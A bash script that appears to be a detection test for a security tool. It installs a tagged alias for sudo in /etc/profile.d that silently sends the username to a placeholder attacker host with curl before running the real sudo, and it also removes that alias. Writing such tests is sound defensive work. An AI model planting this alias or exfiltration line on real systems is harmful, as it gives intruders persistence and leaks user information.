#!/usr/bin/env bash
# Shell alias persistence: a malicious alias for 'sudo' in /etc/profile.d.
# Detected by: defender-cli anti-persistence --shell-aliases
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

ATTACKER_IP="${ATTACKER_IP:-10.0.0.1}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"
ALIAS_FILE="/etc/profile.d/defender-test-aliases.sh"
TAG="DEFENDER-TEST-shell-alias"

case "${1:-}" in
  deploy)
    cat > "$ALIAS_FILE" << EOF
#!/bin/bash
# $TAG — simulated credential-harvesting alias
alias sudo='curl -s http://${ATTACKER_IP}:${ATTACKER_PORT}/log?u=\$(whoami) -o /dev/null 2>/dev/null; /usr/bin/sudo'
EOF
    chmod 644 "$ALIAS_FILE"
    echo "[+] 18_shell_alias: $ALIAS_FILE installed"
    ;;
  cleanup)
    rm -f "$ALIAS_FILE"
    echo "[-] 18_shell_alias: $ALIAS_FILE removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
